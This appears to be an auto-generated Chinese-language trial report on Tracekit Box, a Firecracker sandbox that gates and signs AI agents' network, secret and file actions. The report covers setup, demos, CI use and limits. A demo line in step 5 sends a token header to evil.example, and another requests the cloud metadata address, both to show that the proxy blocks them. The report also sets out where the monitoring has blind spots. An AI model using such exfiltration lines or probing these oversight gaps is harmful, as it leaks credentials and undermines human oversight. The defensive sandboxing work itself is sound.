# Cygnux-Labs/Tracekit-box

- 结论：**值得一试**。建议小范围试用：在一次性 Linux+KVM 主机或 GitHub Actions 中按 README 的 demo/action 跑一个修测试任务，导出 .tkb 并用固定 trust 文件离线验证；原因是步骤具体可复现，但项目仍是 v0、需自建 signer，默认只有 dev 级担保，不宜直接作为生产默认。
- 原文：https://github.com/Cygnux-Labs/Tracekit-box
- 来源：github-search，初筛相关度 2，依据仓库 README
- 调研：自动，模型 deepseek-v4.1-flash:1017，2026-10-30T06:54:43.547Z

## 是什么
Tracekit Box 把 AI agent 放进每个任务独立的 Firecracker micro-VM 中执行真实工作。VM 没有网卡，网络、密钥、模型调用、命令和代码改动都必须经过宿主机上的“门”，由 Tracekit signer 决定并签名；每个任务导出一个 `.tkb` 文件，任何人可离线验证。它面向让 agent 改真实系统的团队：DevOps/SRE、金融/医疗工程，以及在 CI 和生产中跑 agent 的场景。当前状态是 v0，从源码构建，要求一台带 KVM 的 Linux 主机。

## 具体做法（编号步骤；可直接复制的命令、配置、提示词原样放进代码块；写清每步的前提）
**1. 准备前提**
- Linux x86_64 或 arm64，daemon 用户能打开 `/dev/kvm`：裸机、支持嵌套虚拟化的云 VM，或 GitHub 托管的 `ubuntu-latest` runner（action 会启用 KVM）。Mac 上用 docs/development.md 的 Lima VM。
- 安装 `e2fsprogs`（需要 `mkfs.ext4`）和 `git`。
- 同一主机安装 Tracekit 1.4.2 signer：`pip install tracekit-ai==1.4.2`。开发环境可先跑 `tracekit init --dev --v2 --no-hooks && tracekit up --wait`。README 说明更高保证需要把 signer 作为独立用户运行，并在另一台主机放 witness 共同签名 signer 日志。
- 主机需能出站 HTTPS 到镜像仓库（Docker Hub 或 GHCR）。daemon 首次启动会从 GitHub 下载 Firecracker v1.17.0、从 Firecracker 项目的 S3 下载 guest kernel 6.1.155，按 SHA-256 校验后缓存到 `<state dir>/images/assets`；无外网时用 `tkbox daemon --firecracker FILE --kernel FILE` 传本地文件。

**2. 从源码构建并安装**（前提：Go 版本按 go.mod，已装 make；当前没有 release）
```sh
git clone https://github.com/Cygnux-Labs/tracekit-box && cd tracekit-box
make linux                     # bin/tkbox-linux-{amd64,arm64} and bin/tkbox-guest-linux-{amd64,arm64}
arch=$(uname -m); case "$arch" in x86_64) arch=amd64 ;; aarch64) arch=arm64 ;; esac
sudo install -m 0755 "bin/tkbox-linux-$arch" /usr/local/bin/tkbox
sudo install -m 0755 "bin/tkbox-guest-linux-$arch" /usr/local/bin/
tkbox version
```
`tkbox` 默认在自身二进制旁边找 `tkbox-guest-linux-<arch>`，也可用 `tkbox daemon --guest-dir DIR` 指定目录。

**3. 启动 dev signer 和 daemon**（前提：同机已安装 Tracekit；daemon 启动时若没有 signer 应答会退出）
```sh
tracekit init --dev --v2 --no-hooks && tracekit up --wait
export GH_TOKEN=ghp_...   # any GitHub token
tkbox daemon > "${TMPDIR:-/tmp}/tkbox-daemon.log" 2>&1 &
until tkbox ls >/dev/null 2>&1; do sleep 1; done
```
首次启动会下载 Firecracker 和 kernel。dev signer 是 same-user，导出的 bundle 会显示 `Assurance: dev` 和 `isolation: same-user`。

**4. 创建一个 box**（前提：在一个 git checkout 目录中执行；workspace 是 checkout 的副本）
```sh
tkbox run --image python:3.12-slim --allow pypi --allow debian --workspace . --name demo \
  --secret GH=env:GH_TOKEN@api.github.com --env PIP_ROOT_USER_ACTION=ignore --env PIP_DISABLE_PIP_VERSION_CHECK=1
```
`--secret GH=env:GH_TOKEN@api.github.com` 表示把环境变量 `GH_TOKEN` 绑定为 secret `GH`，只在访问 `api.github.com` 时由宿主机代理换入真实值；VM 内只看到占位符。

**5. 执行命令并观察各道门**（前提：box 已创建；示例中 `curl` 不在 python:3.12-slim，所以先用 debian 允许列表安装）
```sh
tkbox exec demo --env DEBIAN_FRONTEND=noninteractive -- sh -c 'apt-get update -q && apt-get install -y -q curl'
tkbox exec demo -- python -c 'print(1+1)'
tkbox exec demo -- pip install -q requests
tkbox exec demo -- curl -sI https://example.com
tkbox exec demo -- curl -sS https://169.254.169.254/
tkbox exec demo -- sh -c 'echo "$GH"'
tkbox exec demo -- sh -c 'curl -sS -H "Authorization: Bearer $GH" http://evil.example/'
tkbox exec demo -- sh -c 'curl -sS -H "Authorization: Bearer $GH" https://api.github.com/user | grep "\"login\""'
```
`example.com` 不在 allowlist，会被挂起，需在宿主机另一个终端运行 `tkbox approvals` 查看 id，再运行 `tkbox approve <id>` 或 `tkbox reject <id>`；无人处理则 2 分钟后拒绝。`169.254.169.254` 是云 metadata 地址，无论 allowlist 或人工批准都会直接拒绝。`echo "$GH"` 只打印占位符。`evil.example` 用明文 HTTP 携带 `GH` 占位符到未绑定主机时会被代理立即阻断并记录 `tkbox.secret.leak`；`api.github.com` 是 `GH` 绑定主机，代理会换入真实 token 的 `Authorization` 头并记录 `tkbox.secret.use`。

**6. 取回改动、停止、导出并离线验证**（前提：`apply` 只能在已停止的 box 上、导出前执行）
```sh
tkbox exec demo -- sh -c 'echo hi > /workspace/x.txt' && tkbox diff demo
tkbox stop demo && tkbox export demo -o demo.tkb
tracekit verify demo.tkb --trust demo.trust.json
```
`tkbox diff demo` 显示 git-format patch。若执行 `tkbox apply demo`，它会对每个文件先问 signer，再写入你的 checkout；示例 demo 不 apply。`tracekit verify` 离线检查 bundle，成功打印 `Integrity: VERIFIED.`；用 dev signer 时还会打印 `Assurance: dev` 和 `isolation: same-user`。README 提醒：应固定你预期的 trust 文件（提交到仓库或放在 CI 外），不要直接信任 bundle 旁边附带的那个。

**7. 在 GitHub Actions 中跑 agent**（前提：使用 GitHub 托管的 ubuntu-latest；action 会启用 KVM、启动 dev signer 和 daemon）
```yaml
jobs:
  fix:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - uses: Cygnux-Labs/tracekit-box/action@main
        with:
          agent: claude-code
          prompt: "Make the failing test in test/parser.test.js pass. Do not change the test."
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
```
action 会在 box 中跑 Claude Code、Codex 或一条命令，停止 box 后，仅当 signer 允许每个文件且没有敏感文件（如 `.github/workflows/**`）时才应用改动，然后导出、验证并上传 bundle。action 的 signer 是同一 job 内创建的 dev signer，没有 witness，所以 bundle 只能验证为 `Assurance: dev`：它证明记录在 job 后未被改动，不证明 runner 本身诚实。README 还说明：action 会把 agent 改动应用到 runner 的 checkout，随后构建/测试这些改动等于在 runner 上运行 agent 的代码；examples/claude-code-fix.yml 给出的安全形状是三个 job：一个用只读 token 跑 box，一个用只读、不持久化、无 secret 的 token 测试 patch，第三个持有写 token 开 PR 且从不运行仓库代码。

**8. 用 Python SDK 调 daemon**（前提：Python 3.9+，从 checkout 安装 `pip install ./sdk/python`）
```python
from tracekit_box import Client

c = Client()
c.create_box("python:3.12-slim", name="demo", allow=["pypi"], workspace=".")
print(c.exec("demo", ["python", "-c", "print(1+1)"]).stdout_text)
```

## 对应的研究问题（对照上面五个问题逐条说明，只写有依据的）
- **能力发现**：README 明确展示可交给 agent 的工作包括：在隔离 VM 中安装系统包、跑 Python 代码、安装 pip 包、发起受 allowlist/人工批准控制的网络连接、使用绑定到特定主机的 secret、修改 `/workspace` 并以 patch 返回、在 CI 中运行 Claude Code/Codex 修测试。原文没有列出更多工作类型。
- **任务匹配**：适合“agent 会改真实系统、需要隔离和可审计”的任务；技术匹配是 Firecracker micro-VM + 无网卡 + 宿主机代理 + Tracekit signer，命令入口有 `tkbox exec`、SDK、MCP 或 action，模型调用走 allow preset/entry 并可作为 secret 绑定。网络不在 allowlist 时采用人工批准；代码写入按文件由 signer 决定。要求 Linux + KVM，不是所有环境都能直接跑。
- **条件供给**：需要提供镜像、allowlist（如 `pypi`、`debian`）、workspace、secret 绑定（`env:GH_TOKEN@api.github.com`）、环境变量；权限上需要 `/dev/kvm`、主机到镜像仓库的 HTTPS、同机 signer；反馈来自签名记录（命令、连接、secret 使用/泄漏、模型调用、文件写入、停止原因）、`tkbox approvals`、`tkbox diff` 和离线 verify。系统是 fail closed：没有 signer 就没有 daemon，signer 不应答会拒绝后续命令、连接和文件写入；无法记录必须保留的事件时会停止 box 并记 `tkbox.gap`。
- **主动推进**：有事件/状态触发的成分：GitHub Action 由 CI job 触发；box 超时、`tkbox stop`、signer 持有或隔离运行会暂停或杀掉 VM，且停止开始时立即关闭 egress。原文没有描述除 CI 和停止/隔离之外的自动定时或长期持续调度。
- **效果验证**：可用 `.tkb` 离线验证记录完整性和 signer 签名；记录中逐项显示 `Bash`、`WebFetch`、`tkbox.secret.use`、`tkbox.secret.leak`、`tkbox.model.call`、`Write` 等决定，以及退出状态和 patch 摘要；README 的 Verified Runs 列表按记录统计命令、连接、holds 和 refusals；action 会导出并验证 bundle 后作为 artifact 上传。原文还声称在真实 KVM 的 CI 中 13/13 端到端检查通过。

## 与已有做法的关系（对照给出的清单条目；没有就写“清单中没有相关条目”）
- **Claude Code（adopt）**：Tracekit Box 的 GitHub Action 明确支持 `agent: claude-code`，把 Claude Code 放进 box 中运行；API key 只到 runner 上的 daemon，Claude Code 在 box 内只看到仅对 `api.anthropic.com` 有效的占位符。它还把 agent 输出和 `tkbox stop`、`diff`、`apply` 打印的文件名写入 job log，并用 `::stop-commands::` 加随机 token 防止 agent 通过打印 `::error::` 等注入 workflow 命令。因此它是 Claude Code 的隔离/审计执行外壳，不替代 Claude Code 本身。
- **Firecracker（study）**：Tracekit Box 直接用 Firecracker v1.17.0 micro-VM 作为隔离边界，VM 无网卡，只通过 vsock 连宿主机的 guest agent 和 egress forwarder；guest kernel 为 6.1.155。它把 Firecracker 的轻量 VM 隔离能力接到 agent 的“门”和签名记录上。
- 清单中没有其他相关条目；README 没有与其他 agent 沙箱或 agent 框架做横向 benchmark。

## 证据与局限（原文给了哪些数据或案例，哪些只是作者主张，适用条件是什么）
- **原文给出的证据**：README 声称在真实 KVM 的 CI 中通过 13/13 端到端检查，经过三轮独立审查和 fuzzing campaign，每个修复都带一个没有该修复就会失败的测试；提供 demo 录屏，标注为“一个真实 box（tkbox fbc1ad1）的录制”，展示允许 pip、挂起 example.com 等人工批准、拒绝云 metadata 地址、GitHub token 只显示占位符、改动以 patch 返回、离线验证。上述是项目方自述和仓库内测试说明，不是独立第三方评测。
- **原文明确承认的局限**：当前是 v0，无 release，从源码构建，一台带 KVM 的 Linux 主机；所有限制在 docs/limits.md，保证边界在 SECURITY.md。dev signer 是 same-user，bundle 只能显示 `Assurance: dev`；更高保证需要 separate-user signer 和另一台主机上的 witness。Action 的 signer 是同一 job 内创建的 dev signer，没有 witness，因此其 bundle 只证明记录未被改动，不证明 runner 诚实。verified bundle 也不证明 agent 没有做“门”看不到的事。命令启动的子进程不会被逐个决定/记录，只会在穿过另一道门（连接、secret、文件改动）时出现。Action 会把改动应用到 runner checkout，随后构建/测试会运行 agent 代码；README 用三 job 的安全形状规避。
- **适用条件**：适合已有 Linux + KVM、愿意维护 signer 和 allowlist、需要让 agent 改真实系统并保留可验证记录的团队；对只需本地简单脚本、无法提供 KVM 或不愿承担 signer 运维成本的场景，这套开销可能不划算。

## 怎么试、怎么验证（最小试用方式和判断有没有改善的指标）
**最小试用**：
1. 在一个一次性 fork 或临时仓库中放一个失败的测试，用上面的 GitHub Action YAML，`permissions.contents: read`，`persist-credentials: false`，`agent: claude-code`，prompt 明确“只改实现、不改测试”。
2. 按 README 的安全形状拆成至少两个后续 job：一个只读、无 secret、不持久化凭据的 job 测试 patch；另一个持有写 token 的 job 只开 PR，不运行仓库代码。
3. 导出 `.tkb`，用你固定/提交的 trust 文件运行 `tracekit verify`，确认退出码 0 和 `Integrity: VERIFIED.`；同时检查记录里是否有命令、连接、holds/refusals、secret 事件和文件写入决定。
4. 另找一台一次性 Linux+KVM 主机跑第 4～6 步 demo，专门验证 `example.com` 挂起、`169.254.169.254` 拒绝、`$GH` 占位符、明文 HTTP 泄漏阻断、`api.github.com` 正常换 token、`tkbox diff` 出 patch。

**判断指标**：
- 任务结果：目标测试是否通过；patch 是否只改预期文件；是否没有任何敏感文件（如 `.github/workflows/**`）被改。
- 隔离效果：云 metadata、private、loopback 地址是否被直接拒绝；allowlist 外主机是否必须人工 `tkbox approve`；明文 HTTP 携带未绑定 secret 是否被阻断并记录 `tkbox.secret.leak`；VM 内是否只看到占位符；日志和记录中是否没有 secret 真值。
- 审计效果：`tracekit verify` 是否返回 0 并打印 `Integrity: VERIFIED.`；记录是否包含预期的 `Bash`、`WebFetch`、`tkbox.secret.use`、`tkbox.model.call`、`Write` 决定；是否出现 `tkbox.gap` 或无法解释的缺口。
- 协作成本：记录中 holds/approvals 的数量、需要人工介入的次数、任务从开始到可审 patch 的时间；与同一任务不用 box 的基线对比成功率和人工介入次数。README 的 13/13 只能作为项目自测参考，不应直接当作你的验收阈值。
- 停止条件：出现 secret 真值泄漏、未批准的代码写入、bundle 无法 verify，或 action 在 runner 上执行了不可信 agent 代码而你没有隔离测试 job，就应停止试用并回到更小范围的 CLI demo。
